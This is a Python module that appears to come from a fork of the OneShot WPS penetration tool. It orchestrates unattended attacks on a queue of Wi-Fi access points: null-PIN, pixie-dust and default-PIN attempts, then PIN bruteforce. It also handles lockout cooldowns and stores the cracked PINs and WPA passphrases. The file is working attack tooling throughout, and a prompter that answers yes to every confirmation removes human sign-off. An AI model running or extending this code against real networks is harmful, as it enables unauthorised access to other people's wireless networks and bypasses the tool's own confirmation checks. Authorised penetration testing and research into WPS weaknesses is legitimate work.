#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

"""Multi-target auto-chain queue orchestrator.

Composes the existing connection.Initialize / bruteforce.Initialize /
generator.WPSpin building blocks (no attack logic duplicated here) into:
- a breadth-first sweep of fast steps (null-pin, pixie-dust, vendor-likely
  default PINs) across every queued target, one attempt per target per
  step per run() call;
- a sequential bruteforce pass over whatever's left uncracked;
- lock-cooldown requeueing (a locked target is skipped for the rest of
  this run() call and revisited on a later one, once its cooldown has
  expired) instead of blocking the whole queue with a sleep.
"""

import dataclasses
import enum
import threading

import src.wps.connection as connection
import src.wps.bruteforce as bruteforce
import src.wps.generator as generator
from src.errors import FatalError
from src.events import Event, EventBus
from src.prompts import Prompter
from src.session import SessionStore
from src.settings import Settings


class ChainStep(enum.Enum):
    """The auto-chain's fast steps, in attack order (cheapest/fastest
    first). BRUTEFORCE is handled as a separate, sequential phase after
    every queued target has had one attempt at each of these."""

    NULL_PIN = 'null_pin'
    PIXIE_DUST = 'pixie_dust'
    DEFAULT_PINS = 'default_pins'
    BRUTEFORCE = 'bruteforce'


_FAST_STEPS = (ChainStep.NULL_PIN, ChainStep.PIXIE_DUST, ChainStep.DEFAULT_PINS)
_FAST_STEP_INDEX = {step.value: i for i, step in enumerate(_FAST_STEPS)}


@dataclasses.dataclass
class Target:
    """One target to enqueue."""

    bssid: str
    essid: str | None = None


class AutoConfirmPrompter(Prompter):
    """A Prompter for unattended auto-chain steps: never blocks on a
    human. confirm()/confirm_explicit_yes() always say yes;
    select_index() always picks the first candidate.
    """

    def confirm(self, message: str) -> bool:
        return True

    def confirm_explicit_yes(self, message: str) -> bool:
        return True

    def select_index(self, prompt: str, count: int, cancel_tokens: frozenset = frozenset()) -> int | None:
        return 0


class Orchestrator:
    """Runs the auto-chain/multi-target queue. enqueue() targets, then
    call run() (on a background thread — it blocks until the queue is
    exhausted or stop()/the stop_flag fires)."""

    def __init__(self, interface: str, base_settings: Settings,
                 session: SessionStore = None, event_bus: EventBus = None,
                 connection_factory=None, bruteforce_factory=None, generator_factory=None):
        self.interface = interface
        self.base_settings = base_settings
        self.session = session if session is not None else SessionStore()
        self.event_bus = event_bus

        # connection_factory's default is wired to this orchestrator's own
        # session and an AutoConfirmPrompter (so an unattended pixie-reuse
        # confirm, if one is ever reached, never blocks on real stdin).
        # Callers (and tests) may override with any 2-arg
        # (interface, settings) -> connection-like callable.
        self.connection_factory = connection_factory or self._default_connection_factory
        self.bruteforce_factory = bruteforce_factory or bruteforce.Initialize
        self.generator_factory = generator_factory or generator.WPSpin

        self._order: list[str] = []
        self._internal_stop = threading.Event()

    def _default_connection_factory(self, interface: str, settings: Settings):
        return connection.Initialize(interface, settings, AutoConfirmPrompter(), self.session)

    def enqueue(self, bssid: str, essid: str = None) -> None:
        self.session.upsert_target(bssid, essid=essid)
        if bssid not in self._order:
            self._order.append(bssid)

    def enqueue_many(self, targets: list) -> None:
        for target in targets:
            self.enqueue(target.bssid, target.essid)

    def stop(self) -> None:
        self._internal_stop.set()

    def get_queue_snapshot(self) -> list:
        return self.session.list_targets()

    def _emit(self, kind: str, level: str, message: str, **data) -> None:
        if self.event_bus is not None:
            self.event_bus.emit(Event(kind=kind, level=level, message=message, data=data))

    def _should_stop(self, stop_flag) -> bool:
        if self._internal_stop.is_set():
            return True
        return stop_flag is not None and stop_flag.is_set()

    def run(self, stop_flag: threading.Event = None) -> None:
        if not self._order:
            return

        self._run_fast_phase(stop_flag)
        if self._should_stop(stop_flag):
            return

        self._run_bruteforce_phase(stop_flag)

    # -- fast phase (NULL_PIN, PIXIE_DUST, DEFAULT_PINS): breadth-first --

    def _is_eligible_for_fast_step(self, bssid: str, step: ChainStep) -> bool:
        target = self.session.get_target(bssid)
        if target is None or target.state in ('cracked', 'failed'):
            return False
        if not self.session.is_cooldown_expired(bssid):
            return False
        if target.last_chain_step is None:
            return True
        return _FAST_STEP_INDEX.get(target.last_chain_step, -1) < _FAST_STEP_INDEX[step.value]

    def _run_fast_phase(self, stop_flag) -> None:
        try:
            conn = self.connection_factory(self.interface, self.base_settings)
        except FatalError as e:
            for bssid in list(self._order):
                self._emit('fatal_error', 'error', str(e), bssid=bssid)
                self.session.mark_failed(bssid)
            return

        for step in _FAST_STEPS:
            for bssid in list(self._order):
                if self._should_stop(stop_flag):
                    return
                if not self._is_eligible_for_fast_step(bssid, step):
                    continue
                try:
                    self._attempt_fast_step(conn, bssid, step)
                except FatalError as e:
                    self._emit('fatal_error', 'error', str(e), bssid=bssid)
                    self.session.mark_failed(bssid)
                if self._should_stop(stop_flag):
                    return

    def _attempt_fast_step(self, conn, bssid: str, step: ChainStep) -> None:
        settings = self.base_settings
        settings.null_pin = False
        settings.pixie_dust = False
        success = False
        pin = None

        try:
            if step is ChainStep.NULL_PIN:
                settings.null_pin = True
                pin = '00000000'
                success = conn.singleConnection(bssid=bssid, retry_on_lock=False)
            elif step is ChainStep.PIXIE_DUST:
                settings.pixie_dust = True
                # The actual pixie-derived PIN isn't exposed by
                # connection.Initialize's current API — only a bool and
                # the WPA_PSK are observable from here.
                success = conn.singleConnection(bssid=bssid, retry_on_lock=False)
            else:  # DEFAULT_PINS
                candidates = self.generator_factory().getAllLikely(bssid)
                if not candidates:
                    return  # no-op: nothing plausible to try for this BSSID
                for candidate_pin in candidates:
                    pin = candidate_pin
                    success = conn.singleConnection(bssid=bssid, pin=candidate_pin, retry_on_lock=False)
                    if success or conn.CONNECTION_STATUS.IS_LOCKED:
                        break
        finally:
            settings.null_pin = False
            settings.pixie_dust = False

        if success:
            self.session.mark_cracked(bssid, pin, conn.CONNECTION_STATUS.WPA_PSK)
            self._emit('cracked', 'success', f'{bssid} cracked', bssid=bssid, step=step.value)
        elif conn.CONNECTION_STATUS.IS_LOCKED:
            self.session.set_cooldown(bssid, settings.timeout)
            self._emit('locked', 'warning', f'{bssid} is WPS locked', bssid=bssid, step=step.value)
        else:
            self.session.set_last_chain_step(bssid, step.value)

    # -- bruteforce phase: sequential, one target at a time --

    @staticmethod
    def _advance_mask(mask: str) -> str:
        if len(mask) == 4:
            return str(int(mask) + 1).zfill(4)
        first_half, second_half = mask[:4], mask[4:]
        return first_half + str(int(second_half) + 1).zfill(3)

    def _run_bruteforce_phase(self, stop_flag) -> None:
        remaining = []
        for bssid in self._order:
            target = self.session.get_target(bssid)
            if target is None or target.state in ('cracked', 'failed'):
                continue
            if not self.session.is_cooldown_expired(bssid):
                continue
            remaining.append(bssid)

        for bssid in remaining:
            if self._should_stop(stop_flag):
                return
            self._run_bruteforce_for_target(bssid, stop_flag)

    def _run_bruteforce_for_target(self, bssid: str, stop_flag) -> None:
        try:
            bf = self.bruteforce_factory(self.interface, self.base_settings, session=self.session)
        except FatalError as e:
            self._emit('fatal_error', 'error', str(e), bssid=bssid)
            self.session.mark_failed(bssid)
            return

        mask = self.session.get_bruteforce_mask(bssid) or '0000'

        while True:
            if self._should_stop(stop_flag):
                return

            try:
                state, result = bf.bruteforceStep(bssid, mask)
            except FatalError as e:
                self._emit('fatal_error', 'error', str(e), bssid=bssid)
                self.session.mark_failed(bssid)
                return

            if state == 'cracked':
                wpa_psk = bf.CONNECTION.CONNECTION_STATUS.WPA_PSK
                self.session.mark_cracked(bssid, result, wpa_psk)
                self._emit('cracked', 'success', f'{bssid} cracked', bssid=bssid, step=ChainStep.BRUTEFORCE.value)
                return

            if state == 'locked':
                self.session.set_cooldown(bssid, self.base_settings.timeout)
                self._emit('locked', 'warning', f'{bssid} is WPS locked', bssid=bssid, step=ChainStep.BRUTEFORCE.value)
                return

            if state == 'first_half_found':
                mask = mask[:4] + '001'
                self.session.update_bruteforce_mask(bssid, mask)
                continue

            if state == 'exhausted':
                self.session.mark_failed(bssid)
                return

            # 'advanced'
            mask = self._advance_mask(mask)
            self.session.update_bruteforce_mask(bssid, mask)
